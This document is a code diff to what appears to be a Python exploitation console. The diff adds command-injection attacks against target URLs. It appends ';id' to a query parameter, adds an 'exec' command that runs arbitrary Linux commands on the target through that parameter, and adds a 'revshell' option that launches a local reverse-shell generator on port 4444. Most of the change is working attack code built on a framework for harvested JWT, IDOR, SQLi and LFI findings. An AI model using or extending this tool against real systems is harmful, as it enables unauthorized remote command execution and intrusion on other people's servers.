@@ -2,6 +2,7 @@ import os
 import sys
 import json
 import urllib.request
+import urllib.parse
 import urllib.error
 import base64
 
@@ -34,7 +35,10 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
         elif cmd == "help":
             print("    Commands:")
             print("      info        - View current target and vulnerability details")
-            print("      exploit     - Re-run the automated exploit/bypass against target")
+            print("      exploit     - Re-run automated exploit payload against target")
+            if vuln_type == "Command Injection":
+                print("      exec <cmd>  - Execute any Linux command (e.g., 'exec ls', 'exec whoami')")
+                print("      revshell    - Generate reverse shell payloads for this target")
             print("      curl        - Send a custom test request to the target")
             print("      exit        - Return to the main dashboard")
         elif cmd == "info":
@@ -70,14 +74,51 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                         print(f"        {body}")
                 except Exception as e:
                     print(f"    [-] Exploit failed: {e}")
+            elif vuln_type == "Command Injection":
+                print("[*] Firing Command Injection test payload (;id)...")
+                try:
+                    parsed = urllib.parse.urlparse(target_url)
+                    q = urllib.parse.parse_qs(parsed.query)
+                    base_val = q.get(param, ["127.0.0.1"])[0]
+                    q[param] = [base_val + ";id"]
+                    new_q = urllib.parse.urlencode(q, doseq=True)
+                    exploit_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_q, parsed.fragment))
+                    
+                    req = urllib.request.Request(exploit_url, headers={'User-Agent': 'Mozilla/5.0'})
+                    with urllib.request.urlopen(req, timeout=3) as resp:
+                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
+                except Exception as e:
+                    print(f"    [-] Exploit failed: {e}")
             else:
                 print(f"[*] Executing generic test against {target_url}...")
                 try:
                     req = urllib.request.Request(target_url, headers={'User-Agent': 'Mozilla/5.0'})
                     with urllib.request.urlopen(req, timeout=3) as resp:
-                        print(f"    [+] Response HTTP {resp.getcode()}: {resp.read().decode('utf-8', errors='ignore')[:200]}")
+                        print(f"    [+] Response HTTP {resp.getcode()}:\n{resp.read().decode('utf-8', errors='ignore')[:300]}")
                 except Exception as e:
                     print(f"    [-] Request failed: {e}")
+        elif cmd.startswith("exec ") and vuln_type == "Command Injection":
+            user_linux_cmd = cmd.split(" ", 1)[1]
+            print(f"[*] Executing command against target: {user_linux_cmd}")
+            try:
+                parsed = urllib.parse.urlparse(target_url)
+                q = urllib.parse.parse_qs(parsed.query)
+                base_val = q.get(param, ["127.0.0.1"])[0]
+                q[param] = [f"{base_val};{user_linux_cmd}"]
+                new_q = urllib.parse.urlencode(q, doseq=True)
+                exploit_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_q, parsed.fragment))
+                
+                req = urllib.request.Request(exploit_url, headers={'User-Agent': 'Mozilla/5.0'})
+                with urllib.request.urlopen(req, timeout=3) as resp:
+                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
+            except Exception as e:
+                print(f"    [-] Execution failed: {e}")
+        elif cmd == "revshell" and vuln_type == "Command Injection":
+            print("[*] Generating active reverse shell payloads (LHOST: 127.0.0.1, LPORT: 4444)...")
+            if os.path.exists("rev_shell.py"):
+                os.system("python rev_shell.py --ip 127.0.0.1 --port 4444")
+            else:
+                print("    [-] rev_shell.py not found.")
         elif cmd.startswith("curl "):
             custom_url = cmd.split(" ", 1)[1]
             try:
@@ -104,7 +145,7 @@ def main_console():
         print(" [Harvested Assets & Interactive Shells]")
         print("  1) JWT Tokens & Privilege Escalation Targets")
         print("  2) IDOR / BOLA Endpoints")
-        print("  3) SQLi & LFI Discovered Vectors")
+        print("  3) SQLi, LFI & Command Injection Vectors")
         print("  4) Open Custom Manual Target Session")
         print("  5) Return to Main Menu")
         print("-" * 65)
@@ -138,13 +179,13 @@ def main_console():
                 run_target_shell(item.get("target"), "IDOR", param=item.get("param"))
 
         elif choice == "3":
-            other_items = [f for f in findings if f.get("vulnerability") in ["SQLi", "LFI"]]
+            other_items = [f for f in findings if f.get("vulnerability") in ["SQLi", "LFI", "Command Injection"]]
             if not other_items:
-                print("[-] No SQLi/LFI vectors found.")
+                print("[-] No SQLi, LFI, or Command Injection vectors found.")
                 continue
-            print("\n[★] SQLi / LFI Vectors:")
+            print("\n[★] SQLi, LFI & Command Injection Vectors:")
             for idx, item in enumerate(other_items, 1):
-                print(f"    {idx}) [{item.get('vulnerability')}] {item.get('target')}")
+                print(f"    {idx}) [{item.get('vulnerability')}] {item.get('target')} (Param: {item.get('param', 'N/A')})")
             sel = input("\nSelect index to open interactive shell (or Enter to go back): ").strip()
             if sel.isdigit() and 1 <= int(sel) <= len(other_items):
                 item = other_items[int(sel) - 1]
